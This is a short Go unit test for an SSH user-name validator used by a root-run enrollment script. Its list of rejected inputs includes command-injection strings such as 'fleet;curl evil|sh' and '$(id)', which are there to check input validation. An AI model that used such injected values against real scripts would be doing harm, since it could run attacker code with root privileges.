package hosts

import "testing"

func TestValidSSHUser(t *testing.T) {
	ok := []string{"", "fleet", "root", "fleet-login", "svc_deploy", "a1"}
	for _, s := range ok {
		if !validSSHUser(s) {
			t.Errorf("validSSHUser(%q) = false, want true", s)
		}
	}
	// Anything that could break out of LOGIN='...' in the root-run enrollment
	// script must be rejected.
	bad := []string{
		"fleet;curl evil|sh", "fleet$(id)", "fleet`id`", "fleet user", "a'b",
		"-leading-dash", "1leadingdigit", "UPPER", "fleet\n", "toolongxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
	}
	for _, s := range bad {
		if validSSHUser(s) {
			t.Errorf("validSSHUser(%q) = true, want false", s)
		}
	}
}
